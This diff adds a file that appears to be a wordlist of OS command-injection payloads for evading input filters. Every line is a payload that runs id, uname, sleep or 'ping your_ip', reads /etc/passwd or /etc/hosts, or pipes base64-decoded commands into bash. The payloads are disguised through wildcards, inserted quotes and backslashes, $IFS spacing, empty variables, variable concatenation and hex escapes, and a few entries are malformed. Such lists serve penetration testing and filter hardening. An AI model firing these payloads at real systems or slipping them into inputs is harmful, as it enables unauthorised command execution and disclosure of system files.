@@ -1,0 +1,409 @@
+/usr/bin/id
+/bin/uname
+uname
+sleep 100
+ping your_ip
+/bin/sleep 100
+/bin/ping your_ip
+/???/???/?d
+ /???/u???e
+/???/s???p 100
+/???/p??g your_ip
+/???/s???p$IFS\100
+/???/p??g$IFS\your_ip
+/???/s???p${IFS}100
+/???/p??g${IFS}your_ip  
+/b*/sl*p 100
+/b*/p*g your_ip
+/u*/b*/id
+/b*/u*e  
+/b*/sl*p$IFS\100
+/b*/sl*p${IFS}100
+/b*/p*g$IFS\your_ip
+/b*/p*g${IFS}your_ip
+/u"s"r/b"i"n/"i"d
+/"b"i"n"/"u"n"a"m"e"
+u"n"a"m"e
+s"l"e"e"p 100
+p"i"n"g" your_ip
+/"b"i"n"/"s"l"e"e"p" 100
+/"b"i"n"/"p"i"n"g your_ip
+/u's'r/b'i'n/'i'd
+/'b'i'n'/'u'n'a'm'e'
+u'n'a'm'e
+s'l'e'e'p 100
+p'i'n'g' your_ip
+/'b'i'n'/'s'l'e'e'p' 100
+/'b'i'n'/'p'i'n'g your_ip
+/usr$d/bin$d/id$d
+/bin$d/uname$d
+uname$d
+sleep$d 100
+ping$d your_ip
+/bin$d/sleep$d 100
+/bin$d/ping$d your_ip
+/\u\s\r/\b\i\n/\i\d
+/\b\i\n/\u\n\a\m\e
+\u\n\a\m\e
+\s\l\e\e\p 100
+\p\i\n\g your_ip
+/\b\i\n/\s\l\e\e\p 100
+/\b\i\n/\p\i\n\g your_ip
+/\\u\\s\\r/\\b\\i\\n/\\i\\d
+/\\b\\i\\n/\\u\\n\\a\\m\\e
+\\u\\n\\a\\m\\e
+\\s\\l\\e\\e\\p 100
+\\p\\i\\n\\g your_ip
+/\\b\\i\\n/\\s\\l\\e\\e\\p 100
+/\\b\\i\\n/\\p\\i\\n\\g your_ip
+/\u$d\s$d\r$d/\b$d\i$d\n$d/\i$d\d$d
+/\b$d\i$d\n$d/\u$d\n$d\a$d\m$d\e$d
+\u$d\n$d\a$d\m$d\e$d
+\s$d\l$d\e$d\e$d\p$d 100
+\p$d\i$d\n$d\g$d your_ip
+/\b$d\i$d\n$d/\s$d\l$d\e$d\e$d\p$d 100
+/\b$d\i$d\n$d/\p$d\i$d\n$d\g$d your_ip
+/\\u$d\\s$d\\r$d/\\b$d\\i$d\\n$d/\\i$d\\d$d
+/\\b$d\\i$d\\n$d/\\u$d\\n$d\\a$d\\m$d\\e$d
+\\u$d\\n$d\\a$d\\m$d\\e$d
+\\s$d\\l$d\\e$d\\e$d\\p$d 100
+\\p$d\\i$d\\n$d\\g$d your_ip
+/\\b$d\\i$d\\n$d/\\s$d\\l$d\\e$d\\e$d\\p$d 100
+/\\b$d\\i$d\\n$d/\\p$d\\i$d\\n$d\\g$d your_ip
+/u$d"s"$d"r"$d/b$d"i"$d"n"$d/id$d
+/b$d"i"$d"n"$d/u$d"n"$d"a"$d"m"$d"e"$d
+u$d"n"$d"a"$d"m"$d"e"$d
+s$d"l"$d"e"$d"e"$d"p"$d 100
+p$d"i"$d"n"$d"g"$d your_ip
+/b$d"i"$d"n"$d/s$d"l"$d"e"$d"e"$d"p"$d 100
+/b$d"i"$d"n"$d/p$d"i"$d"n"$d"g"$d your_ip
+/u$d's'$d'r'$d/b$d'i'$d'n'$d/id$d
+/b$d'i'$d'n'$d/u$d'n'$d'a'$d'm'$d'e'$d
+u$d'n'$d'a'$d'm'$d'e'$d
+s$d'l'$d'e'$d'e'$d'p'$d 100
+p$d'i'$d'n'$d'g'$d your_ip
+/b$d'i'$d'n'$d/s$d'l'$d'e'$d'e'$d'p'$d 100
+/b$d'i'$d'n'$d/p$d'i'$d'n'$d'g'$d your_ip
+cat<>/etc/passwd
+cat</etc/passwd
+cat<>/etc/hosts
+cat</etc/hosts
+cat$d<>/etc$d/passwd$d
+cat$d</etc$d/passwd$d
+c\a$d\t<>/\e$d\t\c/\p$d\a\s$d\s\w\d
+c$d'a'$d't'<>/e$d't'$d'c'/h$d'o'$d's'ts
+/b$d'i'n/c$d'a'$d't'<>/e$d't'$d'c'/h$d'o'$d's'ts
+/b$d"i"n/c$d"a"$d"t"<>/e$d"t"$d"c"/h$d"o"$d"s"ts
+c$d"a"$d"t"<>/e$d"t"$d"c"/h$d"o"$d"s"ts
+/bin/cat</etc/passwd
+/bin/cat<>/etc/passwd
+c\\a$d\\t<>/\\e$d\\t\\c/\\p$d\\a\\s$d\\s\\w\\d
+cat$IFS/etc/passwd
+cat${IFS}/etc/passwd
+cat$d$IFS/etc$d/passwd$d
+cat$d${IFS}/etc$d/passwd$d
+/bin/cat$IFS/etc/passwd
+/bin/cat${IFS}/etc/passwd
+sleep${IFS}100
+ping${IFS}your_ip
+/bin/sleep${IFS}100
+/bin/ping${IFS}your_ip
+sleep$d${IFS}100$d
+c\a$d\t$IFS/\e$d\t\c/\p$d\a\s$d\s\w\d
+c\a$d\t${IFS}/\e$d\t\c/\p$d\a\s$d\s\w\d
+c\\a$d\\t$IFS/\\e$d\\t\\c/\\p$d\\a\\s$d\\s\\w\\d
+c\\a$d\\t${IFS}/\\e$d\\t\\c/\\p$d\\a\\s$d\\s\\w\\d
+c$d'a'$d't'$IFS/e$d't'$d'c'/h$d'o'$d's'ts
+c$d'a'$d't'${IFS}/e$d't'$d'c'/h$d'o'$d's'ts
+/b$d'i'n/c$d'a'$d't'$IFS/e$d't'$d'c'/h$d'o'$d's'ts
+/b$d'i'n/c$d'a'$d't'${IFS}/e$d't'$d'c'/h$d'o'$d's'ts
+/b$d'i'n/c$d'a'$d't'$IFS/e$d't'$d'c'/h$d'o'$d's'ts
+/b$d"i"n/c$d"a"$d"t"$IFS/e$d"t"$d"c"/h$d"o"$d"s"ts
+c$d"a"$d"t"$IFS/e$d"t"$d"c"/h$d"o"$d"s"ts
+sleep$IFS\100
+ping$IFS\your_ip
+/bin/sleep$IFS\100
+/bin/ping$IFS\your_ip
+sleep$d$IFS\100$d
+ping$d$IFS\your_ip$d
+/bin$d/sleep$d$IFS\100$d
+/bin$d/ping$d$IFS\your_ip$d
+sle$d'e'p$d$IFS\100$d
+pi$d'n'g$d$IFS\your_ip$d
+/b$d'i'n$d/sl$d'e'ep$d$IFS\100$d
+\s\l\e\e\p$d$IFS\100$d
+\p\i\n\g$d$IFS\your_ip$d
+/\b\i\n$d/\s\l\e\e\p$d$IFS\100$d
+/\b\i\n$d/\p\i\n\g$d$IFS\your_ip$d
+sle$d"e"p$d$IFS\100$d
+pi$d"n"g$d$IFS\your_ip$d
+/b$d"i"n$d/sl$d"e"ep$d$IFS\100$d
+\\s\\l\\e\\e\\p$d$IFS\\100$d
+\\p\\i\\n\\g$d$IFS\\your_ip$d
+/\\b\\i\\n$d/\\s\\l\\e\\e\\p$d$IFS\\100$d
+/\\b\\i\\n$d/\\p\\i\\n\\g$d$IFS\\your_ip$d
+\s\l\e$d\e\p$d$IFS\100$d
+\p\i$d\n\g$d$IFS\your_ip$d
+/\b$d\i\n$d/sl$d\e\\p$d$IFS\100$d
+\\s\\l\\e\\e\\p$d${IFS}\\100$d
+\\p\\i\\n\\g$d${IFS}\\your_ip$d
+/\\b\\i\\n$d/\\s\\l\\e\\e\\p$d${IFS}\\100$d
+/\\b\\i\\n$d/\\p\\i\\n\\g$d$IFS\\your_ip$d
+\\s\l\\e$d\\e\\p$d$IFS\\100$d
+\\p\\i$d\\n\\g$d$IFS\\your_ip$d
+/\\b$d\\i\\n$d/sl$d\\e\\p$d$IFS\\100$d
+\s\l\e\e\p${d}${IFS}\100${d}
+\p\i\n\g${d}${IFS}\your_ip${d}
+/\b\i\n${d}/\s\l\e\e\p${d}${IFS}\100${d}
+/\b\i\n$d/\p\i\n\g$d${IFS}\your_ip${d}
+\\s\l\\e${d}\\e\\p${d}${IFS}\\100${d}
+\\p\\i${d}\\n\\g${d}${IFS}\\your_ip${d}
+/\\b${d}\\i\\n${d}/sl${d}\\e\\p${d}${IFS}\\100${d}
+s"l"e"e"p${d}${IFS}100${d}
+p"i"n"g"${d}${IFS}your_ip${d}
+/"b"i"n"${d}/"s"l"e"e"p"${d}${IFS}100${d}
+/"b"i"n"$d/"p"i"n"g${d}${IFS}your_ip${d}
+\s\l\e${d}\e\p${d}${IFS}\100${d}
+\p\i${d}\n\\g${d}${IFS}\your_ip${d}
+/\b${d}\i\n${d}/sl${d}\e\p${d}${IFS}\100${d}
+s'l'e'e'p${d}${IFS}100${d}
+p'i'n'g'${d}${IFS}your_ip${d}
+/'b'i'n'${d}/'s'l'e'e'p'${d}${IFS}100${d}
+/'b'i'n'$d/'p'i'n'g${d}${IFS}your_ip${d}
+s"l"e${d}"e"p${d}${IFS}100${d}
+p"i"${d}"n"g${d}${IFS}your_ip${d}
+/"b"${d}i"n"${d}/s"l"${d}"e"p${d}${IFS}100${d}
+s'l'e${d}'e'p${d}${IFS}100${d}
+p'i'${d}'n'g${d}${IFS}your_ip${d}
+/'b'${d}i'n'${d}/s'l'${d}'e'p${d}${IFS}100${d}
+/\\b\\i\\n/\\c\\a$d\\t<>/\\e$d\\t\\c/\\p$d\\a\\s$d\\s\\w\\d
+/\b\i\n/\c\a$d\t<>/\e$d\t\c/\p$d\a\s$d\s\w\d
+s'l'e${d}'e'p${d}${IFS}100${d}
+cat${d}<>/etc${d}/passwd${d}
+/bin$d/cat$d<>/etc$d/passwd$d
+/bin${d}/cat${d}<>/etc${d}/passwd${d}
+/b${d}in/c${d}at<>/e${d}tc/pas${d}swd
+/bin$d/cat$d</etc$d/passwd$d
+/bin${d}/cat${d}</etc${d}/passwd${d}
+/b${d}in/c${d}at</e${d}tc/pas${d}swd
+/u${d}sr/bi${d}n/i${d}d
+/b${d}in/un${d}ame
+un${d}am${d}e
+sl${d}e${d}ep 100
+pin${d}g your_ip
+/b${d}in/sl${d}eep 100
+/b${d}in/p${d}ing your_ip
+sl${d}e${d}ep${IFS}100
+pin${d}g${IFS}yo${d}ur_ip
+/b${d}in/sl${d}eep${IFS}100
+/b${d}in/p${d}ing${IFS}your_ip
+ca${d}t$<>/et${d}c/pa${d}s${d}s${d}w${d}d
+/b${d}in/ca${d}t$<>/et${d}c/pa${d}s${d}s${d}w${d}d
+/b${d}in/ca${d}t$</et${d}c/pa${d}s${d}s${d}w${d}d
+/u$2sr/bi$2n/i$2d
+/b$2in/un$2ame
+un$2am$2e
+sl$2e$2ep 100
+pin$2g your_ip
+/b$2in/sl$2eep 100
+/b$2in/p$2ing your_ip
+sl$2e$2ep$IFS\100
+pin$2g$IFS\your_ip
+sl$2e$2ep${IFS}\100
+pin$2g${IFS}your_ip
+/b$2in/sl$2eep${IFS}100
+/b$2in/p$2ing${IFS}your_ip
+ca$2t$<>/et$2c/pa$2s$2s$2w$2d
+ca$2t$</et$2c/pa$2s$2s$2w$2d
+/b$2in/ca$2t$<>/et$2c/pa$2s$2s$2w$2d
+/b$2in/ca$2t$</et$2c/pa$2s$2s$2w$2d
+/u$*sr/bi$*n/i$*d
+/b$*in/un$*ame
+un$*am$*e
+sl$*e$*ep 100
+pin$*g your_ip
+/b$*in/sl$*eep 100
+/b$*in/p$*ing your_ip
+sl$*e$*ep$IFS\100
+pin$*g$IFS\your_ip
+sl$*e$*ep${IFS}\100
+pin$*g${IFS}your_ip
+/b$*in/sl$*eep${IFS}100
+/b$*in/p$*ing${IFS}your_ip
+ca$*t$<>/et$*c/pa$*s$*s$*w$*d
+ca$*t</et$*c/pa$*s$*s$*w$*d
+/b$*in/ca$*t$<>/et$*c/pa$*s$*s$*w$*d
+/b$*in/ca$*t</et$*c/pa$*s$*s$*w$*d
+/u$@sr/bi$@n/i$@d
+/b$@in/un$@ame
+un$@am$@e
+sl$@e$@ep 100
+pin$@g your_ip
+/b$@in/sl$@eep 100
+/b$@in/p$@ing your_ip
+sl$@e$@ep$IFS\100
+pin$@g$IFS\your_ip
+sl$@e$@ep${IFS}\100
+pin$@g${IFS}your_ip
+/b$@in/sl$@eep${IFS}100
+/b$@in/p$@ing${IFS}your_ip
+ca$@t$<>/et$@c/pa$@s$@s$@w$@d
+ca$@t</et$@c/pa$@s$@s$@w$@d
+/b$@in/ca$@t$<>/et$@c/pa$@s$@s$@w$@d
+/b$@in/ca$@t</et$@c/pa$@s$@s$@w$@d
+/u$!sr/bi$!n/i$!d
+/b$!in/un$!ame
+un$!am$!e
+sl$!e$!ep 100
+pin$!g your_ip
+/b$!in/sl$!eep 100
+/b$!in/p$!ing your_ip
+sl$!e$!ep$IFS\100
+pin$!g$IFS\your_ip
+sl$!e$!ep${IFS}\100
+pin$!g${IFS}your_ip
+/b$!in/sl$!eep${IFS}100
+/b$!in/p$!ing${IFS}your_ip
+ca$!t$<>/et$!c/pa$@s$@s$@w$@d
+ca$!t</et$!c/pa$!s$!s$!w$!d
+/b$!in/ca$!t$<>/et$!c/pa$!s$!s$!w$!d
+/b$!in/ca$!t</et$!c/pa$!s$!s$!w$!d
+`echo "L3Vzci9iaW4vaWQ="|base64 -d`
+$(echo "L3Vzci9iaW4vaWQ="|base64 -d)
+echo "L3Vzci9iaW4vaWQ="|base64 -d|bash
+`echo "L2Jpbi91bmFtZQ=="|base64 -d`
+$(echo "L2Jpbi91bmFtZQ=="|base64 -d)
+echo "L2Jpbi91bmFtZQ=="|base64 -d|bash
+`echo "dW5hbWU="|base64 -d`
+$(echo "dW5hbWU="|base64 -d)
+echo "dW5hbWU="|base64 -d|bash
+`echo "c2xlZXAgMTAw"|base64 -d`
+$(echo "c2xlZXAgMTAw"|base64 -d)
+echo "c2xlZXAgMTAw"|base64 -d|bash
+`echo "L2Jpbi9zbGVlcCAxMDA="|base64 -d`
+$(echo "L2Jpbi9zbGVlcCAxMDA="|base64 -d)
+echo "L2Jpbi9zbGVlcCAxMDA="|base64 -d|bash
+`echo$IFS"L3Vzci9iaW4vaWQ="|base64$IFS-d`
+$(echo$IFS"L3Vzci9iaW4vaWQ="|base64$IFS-d)
+echo$IFS"L3Vzci9iaW4vaWQ="|base64$IFS-d|bash
+`echo$IFS"L2Jpbi91bmFtZQ=="|base64$IFS-d`
+$(echo$IFS"L2Jpbi91bmFtZQ=="|base64$IFS-d)
+echo$IFS"L2Jpbi91bmFtZQ=="|base64$IFS-d|bash
+`echo$IFS"dW5hbWU="|base64$IFS-d`
+$(echo$IFS"dW5hbWU="|base64$IFS-d)
+echo$IFS"dW5hbWU="|base64$IFS-d|bash
+`echo$IFS"c2xlZXAgMTAw"|base64$IFS-d`
+$(echo$IFS"c2xlZXAgMTAw"|base64$IFS-d)
+echo$IFS"c2xlZXAgMTAw"|base64$IFS-d|bash
+`echo$IFS"L2Jpbi9zbGVlcCAxMDA="|base64$IFS-d`
+$(echo$IFS"L2Jpbi9zbGVlcCAxMDA="|base64$IFS-d)
+echo$IFS"L2Jpbi9zbGVlcCAxMDA="|base64$IFS-d|bash
+`echo${IFS}"L3Vzci9iaW4vaWQ="|base64${IFS}-d`
+$(echo${IFS}"L3Vzci9iaW4vaWQ="|base64${IFS}-d)
+echo${IFS}"L3Vzci9iaW4vaWQ="|base64${IFS}-d|bash
+`echo${IFS}"L2Jpbi91bmFtZQ=="|base64${IFS}-d`
+$(echo${IFS}"L2Jpbi91bmFtZQ=="|base64${IFS}-d)
+echo${IFS}"L2Jpbi91bmFtZQ=="|base64${IFS}-d|bash
+`echo${IFS}"dW5hbWU="|base64${IFS}-d`
+$(echo${IFS}"dW5hbWU="|base64${IFS}-d)
+echo${IFS}"dW5hbWU="|base64${IFS}-d|bash
+`echo${IFS}"c2xlZXAgMTAw"|base64${IFS}-d`
+$(echo${IFS}"c2xlZXAgMTAw"|base64${IFS}-d)
+echo${IFS}"c2xlZXAgMTAw"|base64${IFS}-d|bash
+`echo${IFS}"L2Jpbi9zbGVlcCAxMDA="|base64${IFS}-d`
+$(echo${IFS}"L2Jpbi9zbGVlcCAxMDA="|base64${IFS}-d)
+echo${IFS}"L2Jpbi9zbGVlcCAxMDA="|base64${IFS}-d|bash
+/u`ddd`sr/b`ddd`in/i`ddd`d
+/bi`ddd`n/un`ddd`ame
+una`ddd`me
+sle`ddd`ep 100
+pi`ddd`ng your_ip
+/bi`ddd`n/sl`ddd`eep 100
+/b`ddd`in/p`ddd`ing your_ip
+sle`ddd`ep$IFS\100
+pi`ddd`ng$IFS\your_ip
+/bi`ddd`n/sl`ddd`eep$IFS\100
+/b`ddd`in/p`ddd`ing$IFS\your_ip
+sle`ddd`ep${IFS}100
+pi`ddd`ng${IFS}your_ip
+/bi`ddd`n/sl`ddd`eep${IFS}100
+/b`ddd`in/p`ddd`ing${IFS}your_ip
+c`ddd`at<>/e`ddd`tc/pa`ddd`ss`ddd`wd
+c`ddd`at</e`ddd`tc/pa`ddd`ss`ddd`wd
+/u$(ddd)sr/b$(ddd)in/i$(ddd)d
+/bi$(ddd)n/un$(ddd)ame
+una$(ddd)me
+sle$(ddd)ep${IFS}100
+sle$(ddd)ep$IFS\100
+sle$(ddd)ep 100
+pi$(ddd)ng${IFS}your_ip
+pi$(ddd)ng$IFS\your_ip
+pi$(ddd)ng your_ip
+/bi$(ddd)n/sl$(ddd)eep${IFS}100
+/bi$(ddd)n/sl$(ddd)eep$IFS\100
+/bi$(ddd)n/sl$(ddd)eep 100
+/b$(ddd)in/p$(ddd)ing${IFS}your_ip
+/b$(ddd)in/p$(ddd)ing$IFS\your_ip
+/b$(ddd)in/p$(ddd)ing your_ip
+c$(ddd)at<>/e$(ddd)tc/pa$(ddd)ss$(ddd)wd
+c$(ddd)at</e$ddd)tc/pa$(ddd)ss$(ddd)wd
+/us[sr]/bi[vcn]/i[ad]
+/bi[vcn]/u[ln]am[sde]
+/bi[vbn]/sl[sfe]e[erp] 100
+/bi[vbn]/p[ei]n[sg] your_ip
+/bi[vbn]/sl[sfe]e[erp]$IFS\100
+/bi[vbn]/p[ei]n[sg]${IFS}your_ip
+/bi[vbn]/sl[sfe]e[erp]${IFS}100
+/bi[vbn]/p[ei]n[sg]$IFS\your_ip
+${ddd-/us}r${ddd-/bi}n${ddd-/i}d
+${ddd-/bi}n${ddd-/un}a${ddd-m}e
+${asd-u}n${asd-a}m${asd-e}
+${ddd-sl}e${ddd-e}p 100
+${ddd-p}i${ddd-n}g your_ip
+${ddd-/bi}n${ddd-/s}l${ddd-e}e${ddd-p} 100
+${ddd-/bi}n${ddd-/p}i${ddd-n}g your_ip
+${ddd-sl}e${ddd-e}p$IFS\100
+${ddd-p}i${ddd-n}g$IFS\your_ip
+${ddd-/bi}n${ddd-/s}l${ddd-e}e${ddd-p}$IFS\100
+${ddd-/bi}n${ddd-/p}i${ddd-n}g$IFS\your_ip
+${ddd-sl}e${ddd-e}p${IFS}100
+${ddd-p}i${ddd-n}g${IFS}your_ip
+${ddd-/bi}n${ddd-/s}l${ddd-e}e${ddd-p}${IFS}100
+${ddd-/bi}n${ddd-/p}i${ddd-n}g${IFS}your_ip
+a=/us;b=r;c=/b;d=in;f=/i;g=d;$a$b$c$d$f$g
+a=/bi;b=n;c=/u;d=n;f=a;g=me;$a$b$c$d$f$g
+c=u;d=n;f=a;g=me;$c$d$f$g
+c=s;d=le;f=e;g=p;$c$d$f$g 100
+a=p;b=i;c=n;d=g;$a$b$c$d your_ip
+a=/bi;b=n;c=/s;d=l;f=ee;g=p;$a$b$c$d$f$g  100
+a=/bi;b=n;c=/p;d=i;f=n;g=g;$a$b$c$d$f$g your_ip
+c=s;d=le;f=e;g=p;$c$d$f$g$IFS\100
+a=p;b=i;c=n;d=g;$a$b$c$d$IFS\your_ip
+a=/bi;b=n;c=/s;d=l;f=ee;g=p;$a$b$c$d$f$g$IFS\100
+a=/bi;b=n;c=/p;d=i;f=n;g=g;$a$b$c$d$f$g$IFS\your_ip
+c=s;d=le;f=e;g=p;$c$d$f$g${IFS}100
+a=p;b=i;c=n;d=g;$a$b$c$d${IFS}your_ip
+a=/bi;b=n;c=/s;d=l;f=ee;g=p;$a$b$c$d$f$g${IFS}100
+a=/bi;b=n;c=/p;d=i;f=n;g=g;$a$b$c$d$f$g${IFS}your_ip
+a=/us&&b=r&&c=/b&&d=in&&f=/i&&g=d;$a$b$c$d$f$g
+a=/bi&&b=n&&c=/u&&d=n&&f=a&&g=me&&$a$b$c$d$f$g
+c=u&&d=n&&f=a&&g=me&&$c$d$f$g
+c=s&&d=le&&f=e&&g=p&&$c$d$f$g 100
+a=p&&b=i&&c=n&&d=g&&$a$b$c$d your_ip
+a=/bi&&b=n&&c=/s&&d=l&&f=ee&&g=p&&$a$b$c$d$f$g  100
+a=/bi&&b=n&&c=/p&&d=i&&f=n&&g=g&&$a$b$c$d$f$g your_ip
+c=s&&d=le&&f=e&&g=p&&$c$d$f$g$IFS\100
+a=p&&b=i&&c=n&&d=g&&$a$b$c$d$IFS\your_ip
+a=/bi&&b=n&&c=/s&&d=l&&f=ee&&g=p&&$a$b$c$d$f$g$IFS\100
+a=/bi&&b=n&&c=/p&&d=i&&f=n&&g=g&&$a$b$c$d$f$g$IFS\your_ip
+c=s&&d=le&&f=e&&g=p&&$c$d$f$g${IFS}100
+a=p&&b=i&&c=n&&d=g&&$a$b$c$d${IFS}your_ip
+a=/bi&&b=n&&c=/s&&d=l&&f=ee&&g=p&&$a$b$c$d$f$g${IFS}100
+a=/bi&&b=n&&c=/p&&d=i&&f=n&&g=g&&$a$b$c$d$f$g${IFS}your_ip
+\x2F\x75\x73\x72\x2F\x62\x69\x6E\x2F\x69\x64
+\x2F\x62\x69\x6E\x2F\x75\x6E\x61\x6D\x65
+\x75\x6E\x61\x6D\x65
+\x73\x6C\x65\x65\x70\x20\x31\x30\x30
+\x70\x69\x6E\x67\x20your_ip
+\x2F\x62\x69\x6E\x2F\x73\x6C\x65\x65\x70\x20\x31\x30\x30
+\x2F\x62\x69\x6E\x2F\x70\x69\x6E\x67\x20x20your_ip
